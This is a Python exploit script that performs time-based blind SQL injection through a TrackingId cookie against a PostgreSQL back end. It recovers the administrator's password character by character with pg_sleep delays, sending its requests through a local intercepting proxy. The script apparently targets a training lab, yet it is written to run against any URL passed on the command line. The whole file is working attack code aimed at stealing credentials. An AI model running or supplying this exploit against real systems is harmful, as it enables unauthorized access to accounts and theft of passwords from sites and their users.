import sys
import requests
import urllib3
import urllib
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    allowed_chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|;:,.<>?/~`"
    
    for i in range(1, 21):     # Loop through password positions
        found = False

        for char in allowed_chars:   # Loop through characters

            # Correct PostgreSQL syntax with proper URL encoding
            sql_payload = f"'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{char}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--"
            
            # URL encode the entire payload
            encoded_payload = urllib.parse.quote(sql_payload)

            cookies = {
                'TrackingId': 'tOIMTYM9XCpX8UTQ' + encoded_payload,
                'session': 'BvsRxYhgLYeKAQnfZBVzEirAC9lzi644'
            }

            start_time = time.time()
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies, timeout=10)
            elapsed = time.time() - start_time

            # Show progress while guessing
            sys.stdout.write(f"\rPosition {i}: {password_extracted}{char}")
            sys.stdout.flush()

            # If server slept 5 seconds → correct character
            if elapsed > 4.5:
                password_extracted += char
                print(f"\n[+] Position {i}: '{char}' (took {elapsed:.1f}s)")
                found = True
                break

        if not found:
            print(f"\n[-] Could not determine character at position {i}")
            break

    print(f"\n[+] Final password: {password_extracted}")
    return password_extracted


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)

    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()